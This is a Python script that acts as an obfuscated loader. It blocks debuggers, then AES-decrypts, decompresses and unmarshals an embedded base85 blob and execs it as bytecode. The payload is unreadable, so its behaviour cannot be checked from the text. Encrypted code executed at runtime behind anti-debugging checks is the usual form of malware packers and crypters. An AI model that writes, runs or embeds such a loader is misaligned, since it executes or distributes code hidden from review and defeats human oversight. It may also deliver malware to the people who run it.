
import sys
import os
import base64
import marshal
import zlib
import traceback
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _anti_debug():
    if sys.gettrace() or (os.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
        sys.exit(1)
_anti_debug()

_KEY = b'E\xbd7\xe0\xb5|\x86NI\xec\x0c{\x18\n\x0ek\xf7\x84\xa0\xef\xe6\x0c\x10\xb6\r\x7f\x03\xf4{2\xe2\x0e'
_IV = b'\x04\x06\xc1\x9b\x85o\x19\xf6?B\x9a\xd8\xb0\xae\xb0*'

def _decrypt_str(data):
    try:
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        return unpad(cipher.decrypt(data), 16).decode()
    except Exception:
        return ""

def _main():
    try:
        _encrypted = 'JP@GeuS4yw8!q6h5ji1Pu?Kbit+Z7egWDkcY{LL~jWE+}pi2t&7s55YsJm?asnY*0fO~OBX64r!BqR<30gQ1j%0S*Fjj}3xM;|le|A~cd{_+chpbts(y1GSk-T)i3zZ`FT=<Y@^uWS)yjy=!s3k~Fiv(Z=-vkyHf)zwv^ham$h{1w6c$(qLf`JH5)iKb#kY>BO_5K^AGuak#IRT`+>*d<44t@GVaMczom&{P0I_HM!Fp;gzM&@zn&?6-xBPAR+?Iz5Y<6MLSgnPGk{-2=3^ZY1>*?cexA4O?w`266RX%ZiQs6`PF{xwED(djYEFVkgaZ_q7RTYSpq{=19lGOXD(H6x<)w1)o+fAUT%Y;KFo6-d@ND&w7e#>4XR{$+d1SV(WEmeNTI-2`pG^I6dkQrkw0F665XvQ1S@%SLY~J{BK*W3ACBGrOe1pXcj!X!a$x2D^-VHIS4jO=gx|UKV8!Lk!_6iwQd(5PFPHFGGFXjTxXJ;NBOUjM}P(>e{+~6o_wbvusZ+IfBaAs>4ras8k>fHmmty!C+j84(_?Gn7rwH^`qHPc#(2{O3yl)e97tut0fxkwXEa*|WC-Jm?V$X<<?um3Y*ToIV~Im<@SJPOTW6mIqwQa0-olH)sH#why1+OO#`ai?t(!n7nYbp)@4Mg=_xEQio(f(OeX)p`AOYwW2cHDHG&kDklDM>=Ax_sTVC-5C!-$9l1m}zVN?&S#;_fj+'
        
        # Decryption steps
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        encrypted_data = base64.b85decode(_encrypted)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), 16)
        decompressed_data = zlib.decompress(decrypted_data)
        
        curr_mod = sys.modules[__name__]
        ns = curr_mod.__dict__
        ns['_decrypt_str'] = _decrypt_str
        ns['__spec__'] = None
        exec(marshal.loads(decompressed_data), ns, ns)
    except Exception as e:
        print("Execution failed:")
        traceback.print_exc()
        sys.exit(1)

if __name__ in ("__main__", "__mp_main__"):
    _main()
        